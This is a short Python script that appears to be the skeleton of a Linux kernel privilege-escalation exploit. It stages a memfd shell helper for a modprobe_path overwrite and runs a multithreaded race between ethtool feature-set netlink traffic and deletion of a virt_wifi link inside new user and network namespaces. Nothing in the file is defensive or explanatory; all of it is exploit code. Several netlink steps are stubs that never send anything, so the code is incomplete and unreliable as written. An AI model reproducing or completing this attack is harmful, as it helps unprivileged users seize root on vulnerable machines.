import os
import socket
import threading

AF_ALG = 38
NETLINK_ROUTE = 0
NETLINK_GENERIC = 16
ETHTOOL_MSG_FEATURES_SET = 12
RTM_DELLINK = 17


def stage_modprobe_memfd() -> int:
    fd = os.memfd_create("helper", os.MFD_CLOEXEC)
    os.write(fd, b"#!/bin/sh\n/bin/sh\n")
    with open("/proc/sys/kernel/modprobe", "rb") as fh:
        _ = fh.read()
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    s.close()
    return fd


def race_ethtool_virt_wifi() -> None:
    os.unshare(os.CLONE_NEWUSER | os.CLONE_NEWNET)
    rt = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
    link_kind = b"virt_wifi\x00"
    _ = (rt, link_kind, RTM_DELLINK)

    left, right = socket.socketpair(socket.AF_UNIX, socket.SOCK_DGRAM)
    barrier = threading.Barrier(9)

    def flood_features() -> None:
        gn = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
        fam = b"ethtool\x00"
        barrier.wait()
        _ = (gn, fam, ETHTOOL_MSG_FEATURES_SET)
        gn.close()

    threads = [threading.Thread(target=flood_features) for _ in range(8)]
    for t in threads:
        t.start()
    barrier.wait()
    left.send(b"\x02" * 3737)
    for t in threads:
        t.join()
    left.close()
    right.close()
    rt.close()


if __name__ == "__main__":
    stage_modprobe_memfd()
    race_ethtool_virt_wifi()
